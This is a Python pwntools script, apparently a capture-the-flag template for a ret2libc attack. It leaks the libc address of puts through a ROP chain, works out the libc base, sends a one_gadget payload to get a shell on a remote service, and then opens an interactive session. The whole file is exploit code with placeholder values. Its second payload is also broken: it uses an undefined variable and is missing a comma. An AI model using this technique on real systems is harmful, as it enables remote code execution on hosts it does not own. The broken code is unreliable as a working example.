from pwn import *
context.log_level='debug'

### DECLARE ###
BINARY = "./binary"
URL = "someplace.com"
PORT = 1337
OFFSET = 0
PROMPT = "Input: "

### script ###
elf = context.binary = ELF(BINARY)
rop = ROP(BINARY)
p = remote(URL, PORT)

payload1 = flat(
        b"A"*OFFSET,
        rop.rdi.address, elf.got['puts'],
        elf.symbols['puts'],
        elf.symbols['main']
)

p.recvuntil(PROMPT)
p.sendline(payload1)

puts_libc = u64(p.recvline().strip().ljust(8, b"\x00")) # standard
log.info("libc puts is: " + hex(puts_libc))

### DECLARE ###
libc = ELF('./libc.so.6')
one_gadget = 0xdeadbeef

### script ###
libc_base = puts_libc - libc.symbols['puts']
log.info("libc base is: " + hex(libc_base))
syscall = libc_base + one_gadget
payload2 = flat(
	b"A"*offset
	syscall
)

p.recvuntil(PROMPT)
p.sendline(payload2)

p.interactive()
